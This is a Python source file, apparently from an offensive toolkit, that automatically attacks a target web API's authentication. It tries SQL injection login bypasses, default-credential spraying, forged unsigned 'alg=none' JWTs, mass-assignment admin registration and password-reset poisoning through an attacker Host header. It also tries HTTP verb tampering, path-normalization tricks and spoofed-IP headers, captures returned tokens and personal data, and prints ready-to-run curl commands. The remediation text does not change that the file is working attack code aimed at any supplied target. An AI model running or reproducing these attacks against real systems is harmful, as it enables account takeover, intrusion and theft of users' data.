#!/usr/bin/env python3
import asyncio, aiohttp, json, re, sys, base64, hashlib, time, random, string
from pathlib import Path
from urllib.parse import urlparse

sys.path.insert(0, str(Path(__file__).parent))
from smart_filter import (
    delay, confidence_label, meets_confidence_floor,
    random_ua, REQUEST_DELAY, WAF_BYPASS_HEADERS,
)

PROOF_INDICATORS = {
    "auth_success": [
        "access_token", "auth_token", "bearer", "logged_in", "authenticated",
        '"success":true', '"status":"ok"', '"status":"success"',
    ],
    "data_returned": [
        '"id":', '"email":', '"username":', '"phone":', '"address":',
        '"ssn":', '"credit_card":', '"balance":', '"order":', '"payment":',
    ],
    "admin_granted": [
        '"role":"admin"', '"role": "admin"', '"is_admin":true', '"is_admin": true',
        '"admin":true', '"isAdmin":true', '"userType":"admin"', '"privilege":"superadmin"',
    ],
}

SQL_PAYLOADS = [
    ("Classic OR bypass",       "' OR '1'='1",         "' OR '1'='1"),
    ("Comment bypass",          "admin'--",             "anything"),
    ("Double-dash admin",       "admin'-- -",           "pass"),
    ("OR 1=1 numeric",          "1 OR 1=1",             "1 OR 1=1"),
    ("Hex encoded OR",          "' OR 0x313d31--",      "x"),
    ("Always-true with hash",   "' OR 1=1#",            "x"),
    ("UNION null bypass",       "' UNION SELECT null--","x"),
    ("Null byte bypass",        "admin'\x00",           "x"),
    ("Stacked query bypass",    "admin'; SELECT 1--",   "x"),
]

JWT_NONE_VARIANTS = ["none", "None", "NONE", "nOnE", "NoNe"]

DEFAULT_CREDS = [
    ("admin",          "admin"),
    ("admin",          "password"),
    ("admin",          "admin123"),
    ("admin",          "123456"),
    ("admin",          ""),
    ("administrator",  "administrator"),
    ("root",           "root"),
    ("root",           "toor"),
    ("test",           "test"),
    ("guest",          "guest"),
    ("user",           "user"),
    ("demo",           "demo"),
    ("superadmin",     "superadmin"),
    ("admin",          "letmein"),
    ("admin",          "qwerty"),
    ("admin",          "1234"),
    ("admin",          "pass"),
    ("admin",          "welcome"),
]

LOGIN_PATHS = [
    "/api/auth/login", "/api/login", "/api/auth", "/api/v1/auth/login",
    "/api/v1/login", "/api/v2/auth/login", "/auth/login", "/login",
    "/api/sessions", "/api/v1/sessions", "/api/token", "/api/auth/token",
    "/api/users/login", "/api/user/login", "/api/signin",
]

LOGIN_FIELDS = ["username", "email", "login", "user", "user_email", "phone", "mobile"]

PROTECTED_PATHS = [
    "/api/me", "/api/user", "/api/profile", "/api/account",
    "/api/admin", "/api/users", "/api/dashboard", "/api/v1/me",
    "/api/v1/users", "/api/v2/me", "/me", "/profile",
    "/api/admin/users", "/api/v1/admin",
]

REGISTER_PATHS = [
    "/api/register", "/api/auth/register", "/api/v1/register",
    "/api/signup", "/api/auth/signup", "/api/users", "/api/v1/users",
    "/api/v1/auth/register", "/register", "/signup",
]

RESET_PATHS = [
    "/api/auth/forgot-password", "/api/forgot-password",
    "/api/password-reset", "/api/auth/password-reset",
    "/api/v1/auth/forgot", "/forgot-password", "/reset-password",
    "/api/reset", "/api/users/reset",
]

BYPASS_PATHS = [
    ("/ADMIN",         "uppercase bypass"),
    ("/Admin",         "mixed-case bypass"),
    ("/admin%2f",      "URL-encoded slash"),
    ("/admin%252f",    "double-encoded slash"),
    ("/admin;.js",     "semicolon extension bypass"),
    ("/admin/..",      "dot-dot bypass"),
    ("//admin",        "double-slash bypass"),
    ("/admin/",        "trailing-slash bypass"),
    ("/%61dmin",       "hex-encoded first char"),
    ("/admin%09",      "tab bypass"),
    ("/./admin",       "dot bypass"),
]


class AuthBypass:
    def __init__(self, target: str):
        self.target   = target.rstrip("/")
        self.findings = []
        parsed        = urlparse(target)
        self.host     = parsed.netloc
        self.is_https = parsed.scheme == "https"

    def _finding(self, ftype, severity, conf, proof, detail, url,
                 remediation, exploitability, impact, reproducibility,
                 auth_required=False, mitigation_layers=None,
                 proof_type="AUTH_BYPASS", extra=None):
        if not meets_confidence_floor(conf):
            return
        f = {
            "type":              ftype,
            "severity":          severity,
            "confidence":        conf,
            "confidence_label":  confidence_label(conf),
            "url":               url,
            "proof":             proof,
            "detail":            detail,
            "remediation":       remediation,
            "proof_type":        proof_type,
            "exploitability":    exploitability,
            "impact":            impact,
            "reproducibility":   reproducibility,
            "auth_required":     auth_required,
            "mitigation_layers": mitigation_layers or [],
            "mitre_technique":   "T1078",
            "mitre_name":        "Valid Accounts",
        }
        if extra:
            f.update(extra)
        self.findings.append(f)
        print(f"  [{severity}] {ftype}: {url}")

    async def _request(self, sess, method, url, headers=None, json_data=None,
                       data=None, timeout=12):
        h = {"User-Agent": random_ua(), **(headers or {})}
        try:
            async with sess.request(
                method, url, headers=h, json=json_data, data=data,
                ssl=False, allow_redirects=True,
                timeout=aiohttp.ClientTimeout(total=timeout),
            ) as r:
                body = await r.text(errors="ignore")
                return r.status, body, dict(r.headers)
        except Exception:
            return None, "", {}

    async def _post(self, sess, path, json_data=None, headers=None, timeout=12):
        return await self._request(sess, "POST", self.target + path,
                                   headers=headers, json_data=json_data, timeout=timeout)

    async def _get(self, sess, path_or_url, headers=None, timeout=10):
        url = path_or_url if path_or_url.startswith("http") else self.target + path_or_url
        return await self._request(sess, "GET", url, headers=headers, timeout=timeout)

    def _has_auth_success(self, body: str) -> bool:
        bl = body.lower()
        return any(ind in bl for ind in PROOF_INDICATORS["auth_success"])

    def _has_admin(self, body: str) -> bool:
        bl = body.lower()
        return any(ind in bl for ind in PROOF_INDICATORS["admin_granted"])

    def _has_data(self, body: str) -> bool:
        return any(ind in body for ind in PROOF_INDICATORS["data_returned"])

    def _extract_token(self, body: str) -> str | None:
        for pattern in [
            r'"(?:access_token|token|jwt|auth_token)"\s*:\s*"([^"]{20,})"',
            r"'(?:access_token|token|jwt|auth_token)'\s*:\s*'([^']{20,})'",
            r"Bearer\s+([A-Za-z0-9\-_\.]{20,})",
            r"(eyJ[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{10,}\.[A-Za-z0-9_\-]{5,})",
        ]:
            m = re.search(pattern, body)
            if m:
                return m.group(1) if m.lastindex else m.group(0)
        return None

    def _extract_json_field(self, body: str, field: str) -> str | None:
        m = re.search(rf'"{field}"\s*:\s*"?([^",\}}\]{{]+)"?', body)
        return m.group(1).strip() if m else None

    def _sqli_confirmed(self, body: str, token: str | None, email: str | None,
                        role: str | None, baseline_body: str = "") -> bool:
        """Confirm SQLi by comparing the injected response against a *known-bad* baseline.
        Many APIs return tokens on every response (CSRF, session-init), so a token
        alone is not sufficient — we require it to appear in the injected response
        but NOT in the same position in the failed-login baseline."""
        baseline_token = self._extract_token(baseline_body) if baseline_body else None
        # Token present in injected response but absent in the failed-login baseline
        if token and len(token) > 20 and not baseline_token:
            return True
        # Email returned — failed logins virtually never echo the account email
        if email and "@" in email:
            return True
        # Explicit role field in response — failed logins don't include role
        if role and len(role) > 2:
            return True
        # Body-level success + structured data (but only if baseline didn't show same)
        if self._has_auth_success(body) and self._has_data(body):
            if baseline_body and self._has_auth_success(baseline_body):
                return False  # site shows "success" on failed logins too — not confirmed
            return True
        return False

    async def test_sqli_login_bypass(self, sess):
        print("\n[*] Testing SQL injection login bypass...")
        for path in LOGIN_PATHS:
            s0, body0, _ = await self._get(sess, path)
            await delay()
            if s0 is None:
                continue
            # Capture a genuine failed-login baseline to use in confirmation check
            _bl_s, baseline_body, _ = await self._post(
                sess, path,
                json_data={"email": "no_such_user_baseline@notreal.invalid",
                           "password": "baseline_wrong_password_xyz_mirror"})
            await delay()
            baseline_body = baseline_body or ""
            for desc, u_payload, p_payload in SQL_PAYLOADS:
                for username_field in LOGIN_FIELDS:
                    payload = {username_field: u_payload, "password": p_payload}
                    s, body, hdrs = await self._post(sess, path, json_data=payload)
                    await delay()
                    if s is None or s in (404, 405, 429):
                        continue
                    if s not in (200, 201) or len(body) < 40:
                        continue
                    token = self._extract_token(body)
                    email = self._extract_json_field(body, "email")
                    role  = self._extract_json_field(body, "role")
                    uid   = self._extract_json_field(body, "id") or self._extract_json_field(body, "user_id")
                    if not self._sqli_confirmed(body, token, email, role, baseline_body):
                        continue
                    proof = (
                        f"POST {path}\n"
                        f"  {username_field}=\"{u_payload[:50]}\" password=\"{p_payload[:20]}\"\n"
                        f"  HTTP {s} — AUTHENTICATED RESPONSE\n"
                        f"  token={token[:50] + '...' if token and len(token) > 50 else token or 'N/A'}\n"
                        f"  email={email or 'N/A'}  role={role or 'N/A'}  uid={uid or 'N/A'}\n"
                        f"  Body: {body[:400]}"
                    )
                    self._finding(
                        ftype="SQL_INJECTION_AUTH_BYPASS",
                        severity="CRITICAL", conf=96,
                        proof=proof,
                        detail=(
                            f"SQL injection '{u_payload}' in field '{username_field}' bypassed login at {path}. "
                            f"Confirmed by {'token extraction' if token else 'email/role in response'}. "
                            f"No valid password was provided."
                        ),
                        url=self.target + path,
                        remediation=(
                            "1. Use parameterized queries / prepared statements — never concatenate user input into SQL.\n"
                            "2. Apply input validation: reject quotes, dashes, comment sequences.\n"
                            "3. Use an ORM that enforces safe queries.\n"
                            "4. Implement rate limiting and account lockout on login endpoints."
                        ),
                        exploitability=10,
                        impact="Complete authentication bypass — attacker gains admin or first-user account without knowing any password.",
                        reproducibility=(
                            f"curl -s -X POST {self.target}{path} "
                            f"-H 'Content-Type: application/json' "
                            f"-d '{{\"{username_field}\":\"{u_payload}\",\"password\":\"{p_payload}\"}}'"
                        ),
                        auth_required=False,
                        mitigation_layers=["Parameterized queries", "WAF SQLi rules", "Input sanitization", "DB least privilege"],
                        proof_type="AUTH_BYPASS",
                        extra={"sqli_payload": u_payload, "field": username_field,
                               "token_extracted": bool(token), "email_extracted": email, "uid": uid},
                    )
                    return

    async def test_default_credentials(self, sess):
        print("\n[*] Testing default credentials...")
        for path in LOGIN_PATHS:
            s0, _, _ = await self._get(sess, path)
            await delay()
            if s0 is None:
                continue
            for username, password in DEFAULT_CREDS:
                for u_field in ["username", "email", "login"]:
                    payload = {u_field: username, "password": password}
                    s, body, hdrs = await self._post(sess, path, json_data=payload)
                    await delay(0.3)
                    if s is None or s in (404, 405, 429):
                        break
                    if s not in (200, 201) or len(body) < 40:
                        continue
                    token = self._extract_token(body)
                    role  = self._extract_json_field(body, "role")
                    if not self._sqli_confirmed(body, token, username if "@" in username else None, role):
                        continue
                    proof = (
                        f"POST {path}\n"
                        f"  {u_field}=\"{username}\" password=\"{password}\"\n"
                        f"  HTTP {s} — SUCCESSFUL LOGIN\n"
                        f"  token={token[:50] if token else 'N/A'}  role={role or 'N/A'}\n"
                        f"  Body: {body[:400]}"
                    )
                    self._finding(
                        ftype="DEFAULT_CREDENTIALS_ACCEPTED",
                        severity="CRITICAL", conf=97,
                        proof=proof,
                        detail=f"Default credentials {username}:{password!r} accepted at {path}. Confirmed by {'token' if token else 'authenticated response fields'}.",
                        url=self.target + path,
                        remediation=(
                            "1. Remove all default/test accounts before deploying.\n"
                            "2. Force password change on first login.\n"
                            "3. Implement strong password policy (min 12 chars, mixed case, symbols).\n"
                            "4. Enable MFA for all admin accounts."
                        ),
                        exploitability=10,
                        impact="Instant account takeover — no exploitation needed, just known credentials.",
                        reproducibility=(
                            f"curl -s -X POST {self.target}{path} "
                            f"-H 'Content-Type: application/json' "
                            f"-d '{{\"{u_field}\":\"{username}\",\"password\":\"{password}\"}}'"
                        ),
                        auth_required=False,
                        mitigation_layers=["Credential rotation policy", "MFA", "Account lockout after 5 attempts"],
                        proof_type="ACCOUNT_TAKEOVER",
                        extra={"username": username, "password": password, "field": u_field},
                    )
                    return

    async def test_jwt_none_algorithm(self, sess):
        print("\n[*] Testing JWT algorithm=none forgery...")
        for path in PROTECTED_PATHS:
            s_baseline, body_baseline, _ = await self._get(sess, path)
            await delay()
            if s_baseline in (404, 405, None) or s_baseline == 200:
                continue
            for none_variant in JWT_NONE_VARIANTS:
                for role in ["admin", "superadmin", "user"]:
                    header_b64 = base64.urlsafe_b64encode(
                        json.dumps({"alg": none_variant, "typ": "JWT"}).encode()
                    ).rstrip(b"=").decode()
                    payload_dict = {
                        "sub":      "1",
                        "id":       1,
                        "user_id":  1,
                        "role":     role,
                        "email":    "admin@example.com",
                        "is_admin": True,
                        "iat":      int(time.time()),
                        "exp":      int(time.time()) + 86400,
                    }
                    payload_b64 = base64.urlsafe_b64encode(
                        json.dumps(payload_dict).encode()
                    ).rstrip(b"=").decode()
                    forged_jwt = f"{header_b64}.{payload_b64}."
                    auth_header_variants = [
                        {"Authorization": f"Bearer {forged_jwt}"},
                        {"Authorization": forged_jwt},
                        {"X-Auth-Token":  forged_jwt},
                        {"X-Authorization": f"Bearer {forged_jwt}"},
                        {"Token": forged_jwt},
                        {"Authorization": f"JWT {forged_jwt}"},
                    ]
                    for auth_headers in auth_header_variants:
                        s, body, hdrs = await self._get(sess, path, headers=auth_headers)
                        await delay()
                        if s == 200 and (self._has_data(body) or self._has_auth_success(body)):
                            auth_header_name = list(auth_headers.keys())[0]
                            auth_header_val  = list(auth_headers.values())[0][:60]
                            proof = (
                                f"Forged JWT — alg='{none_variant}', role='{role}', NO SIGNATURE:\n"
                                f"  Header:  {{\"alg\":\"{none_variant}\",\"typ\":\"JWT\"}}\n"
                                f"  Payload: {json.dumps(payload_dict)}\n"
                                f"  Token:   {forged_jwt[:80]}...\n"
                                f"  GET {path}\n"
                                f"  {auth_header_name}: {auth_header_val}...\n"
                                f"  HTTP {s} — PROTECTED RESOURCE RETURNED\n"
                                f"  Body: {body[:400]}"
                            )
                            self._finding(
                                ftype="JWT_NONE_ALGORITHM_BYPASS",
                                severity="CRITICAL", conf=97,
                                proof=proof,
                                detail=(
                                    f"JWT library accepts alg='{none_variant}' — signature is not verified. "
                                    f"Forged token with role='{role}' granted access to {path} "
                                    f"via header '{auth_header_name}'."
                                ),
                                url=self.target + path,
                                remediation=(
                                    "1. Explicitly whitelist allowed algorithms (HS256, RS256) — never accept 'none'.\n"
                                    "2. Use a JWT library with secure defaults and reject alg=none at parse time.\n"
                                    "3. Validate the 'alg' header before verifying signature.\n"
                                    "4. Rotate all existing JWTs after patching.\n"
                                    "5. Accept tokens from one header only — do not check X-Auth-Token as fallback."
                                ),
                                exploitability=10,
                                impact="Complete auth bypass — any attacker forges a JWT for any user/role and accesses all protected APIs.",
                                reproducibility=(
                                    "python3 - <<'EOF'\n"
                                    "import base64, json\n"
                                    f"hdr = base64.urlsafe_b64encode(json.dumps({{'alg':'{none_variant}','typ':'JWT'}}).encode()).rstrip(b'=').decode()\n"
                                    f"pay = base64.urlsafe_b64encode(json.dumps({{'role':'{role}','sub':'1','is_admin':True,'exp':9999999999}}).encode()).rstrip(b'=').decode()\n"
                                    "print(hdr + '.' + pay + '.')\n"
                                    "EOF\n"
                                    f"curl -s {self.target}{path} -H '{auth_header_name}: <token_above>'"
                                ),
                                auth_required=False,
                                mitigation_layers=["Algorithm whitelist", "Signature verification enforcement",
                                                   "JWT library patching", "Single auth header"],
                                proof_type="AUTH_BYPASS",
                                extra={"alg_variant": none_variant, "forged_role": role,
                                       "auth_header": auth_header_name,
                                       "forged_token_preview": forged_jwt[:80]},
                            )
                            return

    async def test_mass_assignment(self, sess):
        print("\n[*] Testing mass assignment privilege escalation...")
        rand       = "".join(random.choices(string.ascii_lowercase, k=8))
        test_user  = f"mirror_test_{rand}"
        test_email = f"{test_user}@protonmail.com"
        test_pass  = f"MirrorTest@{rand}!9"
        escalation_fields = [
            {"role": "admin"},
            {"is_admin": True},
            {"admin": True},
            {"isAdmin": True},
            {"userType": "admin"},
            {"permissions": ["admin", "superuser"]},
            {"access_level": 99},
            {"privilege": "superadmin"},
            {"group": "admin"},
            {"account_type": "admin"},
        ]
        for path in REGISTER_PATHS:
            for esc_payload in escalation_fields:
                reg_payload = {
                    "username": test_user, "email": test_email,
                    "password": test_pass, "name": test_user,
                    **esc_payload,
                }
                s, body, _ = await self._post(sess, path, json_data=reg_payload)
                await delay()
                if s is None or s in (404, 405):
                    break
                if s not in (200, 201) or len(body) < 20:
                    continue
                esc_key = list(esc_payload.keys())[0]
                esc_val = list(esc_payload.values())[0]
                body_l  = body.lower()
                accepted = (
                    esc_key in body_l or
                    str(esc_val).lower() in body_l or
                    self._has_admin(body)
                )
                if not accepted:
                    continue
                token = self._extract_token(body)
                verified_role = self._extract_json_field(body, "role")
                for login_path in LOGIN_PATHS:
                    for u_field in ["username", "email"]:
                        ls, lbody, _ = await self._post(
                            sess, login_path,
                            json_data={u_field: test_email if u_field == "email" else test_user,
                                       "password": test_pass},
                        )
                        await delay()
                        if ls in (200, 201) and self._has_data(lbody):
                            ltoken = self._extract_token(lbody)
                            lrole  = self._extract_json_field(lbody, "role")
                            if ltoken and (lrole == "admin" or self._has_admin(lbody)):
                                verified_role = lrole or "admin"
                                token = ltoken
                                break
                proof = (
                    f"POST {path}\n"
                    f"  Escalation payload: {json.dumps(reg_payload)}\n"
                    f"  HTTP {s}\n"
                    f"  Server accepted escalation field '{esc_key}' = {esc_val}\n"
                    f"  Role in response: {verified_role or 'admin-indicator present'}\n"
                    f"  Token: {token[:50] if token else 'N/A'}\n"
                    f"  Body: {body[:400]}"
                )
                self._finding(
                    ftype="MASS_ASSIGNMENT_PRIVILEGE_ESCALATION",
                    severity="CRITICAL", conf=92,
                    proof=proof,
                    detail=(
                        f"Registration at {path} accepts '{esc_key}' field and reflects it. "
                        f"Attacker registers as admin by including '{esc_key}:{esc_val}' in payload. "
                        f"Role confirmed: {verified_role or 'admin-indicator in response'}."
                    ),
                    url=self.target + path,
                    remediation=(
                        "1. Use an explicit allowlist of accepted registration fields — never bind all request fields.\n"
                        "2. Never set user roles/permissions from client-supplied data — assign server-side only.\n"
                        "3. Strip all non-whitelisted fields before processing.\n"
                        "4. Use DTOs/schema validation that only exposes permitted fields."
                    ),
                    exploitability=9,
                    impact="Attacker self-registers as admin — gains full admin access with no prior authentication.",
                    reproducibility=(
                        f"curl -s -X POST {self.target}{path} "
                        f"-H 'Content-Type: application/json' "
                        f"-d '{json.dumps(reg_payload)}'"
                    ),
                    auth_required=False,
                    mitigation_layers=["Field allowlisting", "Server-side role assignment", "Input schema validation"],
                    proof_type="ACCOUNT_TAKEOVER",
                    extra={"escalation_field": esc_key, "escalation_value": str(esc_val),
                           "verified_role": verified_role},
                )
                return

    async def test_password_reset_poisoning(self, sess):
        print("\n[*] Testing password reset host header poisoning...")
        poison_host = "attacker.mirror-scanner.evil"
        for path in RESET_PATHS:
            for email_field in ["email", "username", "user_email"]:
                payload    = {email_field: "admin@example.com"}
                poison_hdrs = {
                    "Host":       poison_host,
                    "X-Forwarded-Host": poison_host,
                    "X-Host":     poison_host,
                    "User-Agent": random_ua(),
                }
                s, body, hdrs = await self._post(sess, path, json_data=payload, headers=poison_hdrs)
                await delay()
                if s is None or s in (404, 405):
                    break
                if s in (200, 201, 202) and (
                    poison_host in body or
                    "reset" in body.lower() or
                    "email" in body.lower() or
                    "sent" in body.lower()
                ):
                    reflected = poison_host in body
                    proof = (
                        f"POST {path}\n"
                        f"  Host: {poison_host}\n"
                        f"  X-Forwarded-Host: {poison_host}\n"
                        f"  body: {{\"{email_field}\":\"admin@example.com\"}}\n"
                        f"  HTTP {s}\n"
                        f"  Poison host reflected in response: {'YES — CONFIRMED' if reflected else 'NO (but reset triggered)'}\n"
                        f"  Body: {body[:400]}"
                    )
                    conf = 95 if reflected else 75
                    self._finding(
                        ftype="PASSWORD_RESET_HOST_HEADER_POISONING",
                        severity="HIGH", conf=conf,
                        proof=proof,
                        detail=(
                            f"Password reset at {path} triggered with poisoned Host header '{poison_host}'. "
                            f"{'Attacker domain reflected in response — reset link will contain attacker domain.' if reflected else 'Reset triggered — if host header used in email template, link goes to attacker domain.'}"
                        ),
                        url=self.target + path,
                        remediation=(
                            "1. Hardcode the application domain in password reset links — never use the Host header.\n"
                            "2. Validate the Host header against a whitelist of permitted domains.\n"
                            "3. Set APP_URL/BASE_URL in environment config and use that for all link generation.\n"
                            "4. Add Host header validation middleware that rejects unknown domains."
                        ),
                        exploitability=7,
                        impact=(
                            "Account takeover — user clicks reset link that goes to attacker domain. "
                            "Attacker captures reset token and uses it to take over the account."
                        ),
                        reproducibility=(
                            f"curl -s -X POST {self.target}{path} "
                            f"-H 'Host: {poison_host}' "
                            f"-H 'X-Forwarded-Host: {poison_host}' "
                            f"-H 'Content-Type: application/json' "
                            f"-d '{{\"{email_field}\":\"admin@example.com\"}}'"
                        ),
                        auth_required=False,
                        mitigation_layers=["Hardcoded APP_URL", "Host header whitelist", "Strict transport security"],
                        proof_type="ACCOUNT_TAKEOVER",
                        extra={"email_field": email_field, "poison_host_reflected": reflected},
                    )
                    return

    async def test_http_verb_tampering(self, sess):
        print("\n[*] Testing HTTP verb tampering past auth middleware...")
        for path in PROTECTED_PATHS:
            s_get, body_get, _ = await self._get(sess, path)
            await delay()
            if s_get in (404, None):
                continue
            if s_get == 200 and self._has_data(body_get):
                continue
            for method in ["HEAD", "OPTIONS", "TRACE", "PATCH", "PUT", "DELETE",
                           "CONNECT", "PROPFIND", "SEARCH"]:
                s, body, hdrs = await self._request(sess, method, self.target + path)
                await delay(0.12)
                if s is None:
                    continue
                allow_hdr = hdrs.get("Allow", hdrs.get("allow", ""))
                if s == 200 and self._has_data(body):
                    proof = (
                        f"Baseline GET {path} -> HTTP {s_get} (blocked)\n"
                        f"{method} {path} -> HTTP {s}\n"
                        f"  Auth middleware bypassed via verb tampering!\n"
                        f"  Body: {body[:400]}"
                    )
                    self._finding(
                        ftype="HTTP_VERB_TAMPERING_AUTH_BYPASS",
                        severity="HIGH", conf=89,
                        proof=proof,
                        detail=(
                            f"HTTP verb tampering bypasses auth at {path}. "
                            f"GET returns HTTP {s_get} but {method} returns HTTP 200 with data. "
                            "Auth middleware only checks specific HTTP methods."
                        ),
                        url=self.target + path,
                        remediation=(
                            "1. Apply authorization checks independent of HTTP method — check on every request.\n"
                            "2. Only permit GET, POST, PUT, PATCH, DELETE where required — return 405 for others.\n"
                            "3. Do not rely on method-based routing for security decisions.\n"
                            "4. Add an integration test that checks every HTTP method on protected endpoints."
                        ),
                        exploitability=7,
                        impact=f"Auth bypass — protected endpoint {path} accessible via {method} without authentication.",
                        reproducibility=f"curl -s -X {method} {self.target}{path}",
                        auth_required=False,
                        mitigation_layers=["Method-agnostic auth middleware", "Allowed methods allowlist"],
                        proof_type="AUTH_BYPASS",
                        extra={"bypass_method": method, "baseline_status": s_get},
                    )
                    return

    async def test_path_normalization_bypass(self, sess):
        print("\n[*] Testing path normalization bypass (/ADMIN, hex, semicolon)...")
        s_normal, body_normal, _ = await self._get(sess, "/admin")
        await delay()
        if s_normal == 200 and self._has_data(body_normal):
            return
        for bypass_path, technique in BYPASS_PATHS:
            s, body, hdrs = await self._get(sess, bypass_path)
            await delay(0.1)
            if s is None or s == 404:
                continue
            if s == 200 and (self._has_data(body) or self._has_admin(body) or len(body) > 200):
                proof = (
                    f"Normal /admin -> HTTP {s_normal} (blocked)\n"
                    f"{bypass_path} -> HTTP {s} — BYPASS SUCCESSFUL ({technique})\n"
                    f"  Body: {body[:400]}"
                )
                self._finding(
                    ftype="PATH_NORMALIZATION_AUTH_BYPASS",
                    severity="HIGH", conf=87,
                    proof=proof,
                    detail=(
                        f"Path normalization bypass — '{bypass_path}' ({technique}) bypasses auth at /admin. "
                        f"Auth middleware checks path literally but web server normalizes it before routing."
                    ),
                    url=self.target + bypass_path,
                    remediation=(
                        "1. Normalize and canonicalize all paths before any authorization check.\n"
                        "2. Apply auth middleware after URL decoding and path normalization.\n"
                        "3. Use a framework-level route guard, not string matching on raw paths.\n"
                        "4. Test all bypass variants as part of your security regression suite."
                    ),
                    exploitability=7,
                    impact=f"Admin panel bypass — attacker accesses /admin-protected resources via '{bypass_path}' without authentication.",
                    reproducibility=f"curl -s {self.target}{bypass_path}",
                    auth_required=False,
                    mitigation_layers=["Pre-auth path normalization", "Framework route guards"],
                    proof_type="AUTH_BYPASS",
                    extra={"bypass_path": bypass_path, "technique": technique},
                )
                return

    async def test_waf_bypass_headers(self, sess):
        print("\n[*] Testing WAF/IP restriction bypass with forged headers...")
        for path in PROTECTED_PATHS + ["/api/admin", "/api/admin/users"]:
            s_baseline, body_baseline, _ = await self._get(sess, path)
            await delay()
            if s_baseline in (404, None) or s_baseline == 200:
                continue
            waf_headers = {**WAF_BYPASS_HEADERS, "User-Agent": random_ua()}
            s, body, hdrs = await self._get(sess, path, headers=waf_headers)
            await delay()
            if s == 200 and (self._has_data(body) or self._has_admin(body)):
                proof = (
                    f"Baseline GET {path} (no bypass headers) -> HTTP {s_baseline}\n"
                    f"GET {path} with X-Forwarded-For: 127.0.0.1 + bypass headers -> HTTP {s}\n"
                    f"  WAF/IP restriction bypassed!\n"
                    f"  Body: {body[:400]}"
                )
                self._finding(
                    ftype="WAF_IP_RESTRICTION_BYPASS",
                    severity="HIGH", conf=87,
                    proof=proof,
                    detail=(
                        f"IP restriction or WAF at {path} bypassed via X-Forwarded-For/X-Real-IP headers. "
                        "Server trusts client-supplied headers for IP-based access control."
                    ),
                    url=self.target + path,
                    remediation=(
                        "1. Never trust X-Forwarded-For or X-Real-IP for access control decisions.\n"
                        "2. If your infrastructure uses a proxy, only trust the LAST hop's IP from a known proxy range.\n"
                        "3. IP-based access control should use the raw socket IP (REMOTE_ADDR), not request headers.\n"
                        "4. For admin endpoints, use network-level access controls (VPN, firewall), not application-level IP checks."
                    ),
                    exploitability=7,
                    impact=f"IP-restricted admin endpoints accessible by anyone — attacker spoofs IP via header to reach {path}.",
                    reproducibility=(
                        f"curl -s {self.target}{path} "
                        f"-H 'X-Forwarded-For: 127.0.0.1' "
                        f"-H 'X-Real-IP: 127.0.0.1' "
                        f"-H 'True-Client-IP: 127.0.0.1'"
                    ),
                    auth_required=False,
                    mitigation_layers=["Use REMOTE_ADDR only", "Firewall-level IP control", "VPN for admin access"],
                    proof_type="AUTH_BYPASS",
                    extra={"bypass_headers": list(WAF_BYPASS_HEADERS.keys())},
                )
                return

    async def run(self):
        print(f"\n{'='*60}\n  AuthBypass — Proof-of-Exploitation Auth Bypass\n  Target: {self.target}\n{'='*60}")
        timeout   = aiohttp.ClientTimeout(total=18, connect=8)
        connector = aiohttp.TCPConnector(ssl=False, limit=4)
        async with aiohttp.ClientSession(connector=connector, timeout=timeout) as sess:
            await self.test_sqli_login_bypass(sess)
            await self.test_default_credentials(sess)
            await self.test_jwt_none_algorithm(sess)
            await self.test_mass_assignment(sess)
            await self.test_password_reset_poisoning(sess)
            await self.test_http_verb_tampering(sess)
            await self.test_path_normalization_bypass(sess)
            await self.test_waf_bypass_headers(sess)
        print(f"\n[+] AuthBypass complete: {len(self.findings)} confirmed findings")
        return self.findings


async def main():
    import os
    target = os.environ.get("ARSENAL_TARGET", "")
    if not target:
        print("[!] No target — set ARSENAL_TARGET", file=sys.stderr)
        sys.exit(1)
    scanner = AuthBypass(target)
    findings = await scanner.run()
    out = Path(__file__).parent.parent / "reports" / "authbypass.json"
    out.write_text(json.dumps(findings, indent=2))
    print(f"[+] Saved {len(findings)} findings -> {out}")

if __name__ == "__main__":
    asyncio.run(main())
